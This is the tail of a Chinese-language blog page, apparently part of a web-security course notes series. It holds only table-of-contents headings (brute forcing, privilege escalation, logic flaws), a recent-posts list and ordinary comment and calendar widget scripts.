href="#%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E"><span class="toc-number">9.1.1.3.3.</span> <span class="toc-text">实体声明</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80"><span class="toc-number">9.2.</span> <span class="toc-text">漏洞基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-number">9.3.</span> <span class="toc-text">漏洞危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">9.4.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">10.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-3"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#C-S%E6%9E%B6%E6%9E%84%E7%A0%B4%E8%A7%A3"><span class="toc-number">10.1.1.</span> <span class="toc-text">C&#x2F;S架构破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-S%E6%9E%B6%E6%9E%84%E7%A0%B4%E8%A7%A3"><span class="toc-number">10.1.2.</span> <span class="toc-text">B&#x2F;S架构破解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">10.2.</span> <span class="toc-text">漏洞发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E8%8C%83%E6%96%B9%E6%B3%95"><span class="toc-number">10.3.</span> <span class="toc-text">防范方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E4%B8%8E%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text">越权与逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">11.1.</span> <span class="toc-text">越权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E5%9F%BA%E7%A1%80"><span class="toc-number">11.1.1.</span> <span class="toc-text">越权基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E5%8F%91%E7%8E%B0"><span class="toc-number">11.1.2.</span> <span class="toc-text">越权发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.2.</span> <span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-1"><span class="toc-number">11.2.1.</span> <span class="toc-text">漏洞发现</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/oldboy5/" title="老男孩--内网渗透(5)"><img src="/img/oldboy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="老男孩--内网渗透(5)"/></a><div class="content"><a class="title" href="/2025/05/12/oldboy5/" title="老男孩--内网渗透(5)">老男孩--内网渗透(5)</a><time datetime="2025-05-12T10:55:16.000Z" title="Created 2025-05-12 18:55:16">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/oldboy4/" title="老男孩--DDOS攻击与防御(4)"><img src="/img/oldboy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="老男孩--DDOS攻击与防御(4)"/></a><div class="content"><a class="title" href="/2025/05/12/oldboy4/" title="老男孩--DDOS攻击与防御(4)">老男孩--DDOS攻击与防御(4)</a><time datetime="2025-05-12T10:55:14.000Z" title="Created 2025-05-12 18:55:14">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/oldboy3/" title="老男孩--手机端信息收集及渗透(3)"><img src="/img/oldboy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="老男孩--手机端信息收集及渗透(3)"/></a><div class="content"><a class="title" href="/2025/05/12/oldboy3/" title="老男孩--手机端信息收集及渗透(3)">老男孩--手机端信息收集及渗透(3)</a><time datetime="2025-05-12T10:55:12.000Z" title="Created 2025-05-12 18:55:12">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/oldboy2/" title="老男孩--Web十大常规漏洞(2)"><img src="/img/oldboy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="老男孩--Web十大常规漏洞(2)"/></a><div class="content"><a class="title" href="/2025/05/12/oldboy2/" title="老男孩--Web十大常规漏洞(2)">老男孩--Web十大常规漏洞(2)</a><time datetime="2025-05-12T10:55:10.000Z" title="Created 2025-05-12 18:55:10">2025-05-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/05/12/oldboy1/" title="老男孩--信息收集(1)"><img src="/img/oldboy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="老男孩--信息收集(1)"/></a><div class="content"><a class="title" href="/2025/05/12/oldboy1/" title="老男孩--信息收集(1)">老男孩--信息收集(1)</a><time datetime="2025-05-12T10:55:09.000Z" title="Created 2025-05-12 18:55:09">2025-05-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/bottom-bg.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By GoldY</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://yuwenjin666.github.io',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const init = (el = document, path = location.pathname) => {
    twikoo.init({
      el: el.querySelector('#twikoo-wrap'),
      envId: 'https://yuwenjin666.github.io',
      region: '',
      onCommentLoaded: () => {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      },
      ...option,
      path: isShuoshuo ? path : (option && option.path) || path
    })

    

    isShuoshuo && (window.shuoshuoComment.destroyTwikoo = () => {
      if (el.children.length) {
        el.innerHTML = ''
        el.classList.add('no-comment')
      }
    })
  }

  const loadTwikoo = (el, path) => {
    if (typeof twikoo === 'object') setTimeout(() => init(el, path), 0)
    else btf.getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(() => init(el, path))
  }

  if (isShuoshuo) {
    'Twikoo' === 'Twikoo'
      ? window.shuoshuoComment = { loadComment: loadTwikoo }
      : window.loadOtherComment = loadTwikoo
    return
  }

  if ('Twikoo' === 'Twikoo' || !false) {
    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
  <script data-pjax src="/js/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=yuwenjin666";
            var git_color =['#ebedf0', '#a2f7af', '#6ce480', '#54ad63', '#469252', '#31753c', '#1f5f2a', '#13531f', '#084111', '#032b09', '#000000'];
            var git_user ="yuwenjin666";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/'){
                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body></html>